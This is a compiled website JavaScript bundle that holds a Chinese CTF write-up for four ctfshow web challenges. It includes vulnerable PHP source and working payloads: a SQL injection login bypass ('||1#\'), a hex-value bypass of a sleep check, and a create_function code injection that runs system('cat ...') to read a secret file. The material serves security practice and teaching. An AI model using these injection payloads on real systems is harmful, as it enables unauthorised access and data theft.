"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[9059],{2658:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>a,frontMatter:()=>t,metadata:()=>c,toc:()=>d});const c=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow-\u5927\u8d5b\u539f\u9898","title":"ctfshow-\u5927\u8d5b\u539f\u9898","description":"web680(disabled_func)","source":"@site/docs/CTF/CTFSHOW/ctfshow-\u5927\u8d5b\u539f\u9898.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow-\u5927\u8d5b\u539f\u9898","permalink":"/docs/CTF/CTFSHOW/ctfshow-\u5927\u8d5b\u539f\u9898","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow-\u5927\u8d5b\u539f\u9898.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshow-xxe","permalink":"/docs/CTF/CTFSHOW/ctfshow-xxe"},"next":{"title":"ctfshowphp\u7279\u60271","permalink":"/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60271"}}');var s=r(4848),i=r(8453);const t={},o=void 0,l={},d=[{value:"web680(disabled_func)",id:"web680disabled_func",level:2},{value:"web681(\u6784\u9020\u4e07\u80fd\u5bc6\u7801)",id:"web681\u6784\u9020\u4e07\u80fd\u5bc6\u7801",level:2},{value:"web683(16\u8fdb\u5236\u7ed5\u8fc7)",id:"web68316\u8fdb\u5236\u7ed5\u8fc7",level:2},{value:"web684(create_function)",id:"web684create_function",level:2}];function h(e){const n={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"web680disabled_func",children:"web680(disabled_func)"}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\u6211\u8f93\u5165\u4e86\uff0c",(0,s.jsx)(n.code,{children:"code=phpinfo();"})]}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u7981\u7528\u4e86\u5f88\u591a\u51fd\u6570\uff0c"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u91cc\u53ef\u4ee5\u7528\u8681\u5251\u8fde\u4e0a\uff0c\u4f46\u662f\u4ec0\u4e48\u4e5f\u770b\u4e0d\u4e86"}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u7740"}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u4e00\u4e0b\u5f53\u524d\u76ee\u5f55"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"code=var_dump(scandir('.'));"})}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'array(4) {\r\n  [0]=>\r\n  string(1) "."\r\n  [1]=>\r\n  string(2) ".."\r\n  [2]=>\r\n  string(9) "index.php"\r\n  [3]=>\r\n  string(21) "secret_you_never_know"\r\n}\r\n\r\npost code to run!\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u76f4\u63a5\u8bbf\u95eesecret_you_never_know\u5c31\u662fflag"}),"\n",(0,s.jsx)(n.h2,{id:"web681\u6784\u9020\u4e07\u80fd\u5bc6\u7801",children:"web681(\u6784\u9020\u4e07\u80fd\u5bc6\u7801)"}),"\n",(0,s.jsx)(n.p,{children:"\u968f\u4fbf\u7ed9\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ed6\u4f1a\u8fd4\u56de"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"select count(*) from ctfshow_users where username = '11' or nickname = '11'\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u8f93\u5165\u5355\u5f15\u53f7\uff0c\u4ed6\u4f1a\u76f4\u63a5\u5220\u6389"}),"\n",(0,s.jsx)(n.p,{children:"\u7528\u659c\u7ebf\u8bd5\u8bd5\uff0c\u5c06\u5355\u5f15\u53f7\u8f6c\u4e49"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"select count(*) from ctfshow_users where username = '11\\' or nickname = '11\\'\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6784\u9020\u4e07\u80fd\u5bc6\u7801"}),"\n",(0,s.jsxs)(n.p,{children:["\u8f93\u5165",(0,s.jsx)(n.code,{children:"||1#\\"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"select count(*) from ctfshow_users where username = '||1#\\' or nickname = '||1#\\'\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230flag"}),"\n",(0,s.jsx)(n.h2,{id:"web68316\u8fdb\u5236\u7ed5\u8fc7",children:"web683(16\u8fdb\u5236\u7ed5\u8fc7)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:" <?php\r\n\r\n   error_reporting(0);\r\n   include \"flag.php\";\r\n   if(isset($_GET['\u79c0'])){\r\n       if(!is_numeric($_GET['\u79c0'])){\r\n          die('\u5fc5\u987b\u662f\u6570\u5b57');\r\n       }else if($_GET['\u79c0'] < 60 * 60 * 24 * 30 * 2){\r\n          die('\u4f60\u592a\u77ed\u4e86');\r\n       }else if($_GET['\u79c0'] > 60 * 60 * 24 * 30 * 3){\r\n           die('\u4f60\u592a\u957f\u4e86');\r\n       }else{\r\n           sleep((int)$_GET['\u79c0']);\r\n           echo $flag;\r\n       }\r\n       echo '<hr>';\r\n   }\r\n   highlight_file(__FILE__); \n"})}),"\n",(0,s.jsx)(n.p,{children:"16\u8fdb\u5236\u88abint\u51fd\u6570\u8f6c\u62100"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240317154752728.png",alt:"image-20240317154752728"})}),"\n",(0,s.jsx)(n.p,{children:"payload"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\u79c0=0x76A6FA\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web684create_function",children:"web684(create_function)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:" <?php\r\n$action = $_GET['action'] ?? '';\r\n$arg = $_GET['arg'] ?? '';\r\n\r\nif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\r\n    show_source(__FILE__);\r\n} else {\r\n    $action('', $arg);\r\n}\n"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"$result = $value1 ?? $value2;\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c ",(0,s.jsx)(n.code,{children:"$value1"})," \u4e0d\u4e3a ",(0,s.jsx)(n.code,{children:"null"}),"\uff0c\u5219 ",(0,s.jsx)(n.code,{children:"$result"})," \u5c06\u88ab\u8d4b\u503c\u4e3a ",(0,s.jsx)(n.code,{children:"$value1"}),"\uff0c\u5426\u5219\u5c06\u88ab\u8d4b\u503c\u4e3a ",(0,s.jsx)(n.code,{children:"$value2"}),"\u3002"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"payload"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'?action=%5ccreate_function&arg=}system("cat /secret_you_never_know");//\n'})}),"\n",(0,s.jsx)(n.p,{children:"%5c\u662f\u8f6c\u4e49\u7b26"})]})}function a(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>t,x:()=>o});var c=r(6540);const s={},i=c.createContext(s);function t(e){const n=c.useContext(i);return c.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:t(e.components),c.createElement(i.Provider,{value:n},e.children)}}}]);